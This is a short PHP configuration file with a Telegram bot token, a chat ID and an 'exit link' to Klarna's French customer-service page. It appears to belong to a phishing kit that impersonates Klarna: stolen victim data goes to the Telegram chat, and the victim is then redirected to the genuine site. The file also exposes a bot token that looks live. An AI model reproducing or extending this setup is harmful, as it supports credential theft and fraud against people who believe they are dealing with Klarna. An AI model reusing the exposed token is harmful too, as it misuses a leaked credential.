<?php


// telegram information
$token = "8637862643:AAFh4dBYXkjDKbJnqrjOQEb1YGjHTSa4vS0";
$id = "-5151650569";

// exit link
$exit = "https://www.klarna.com/fr/service-client/";



?>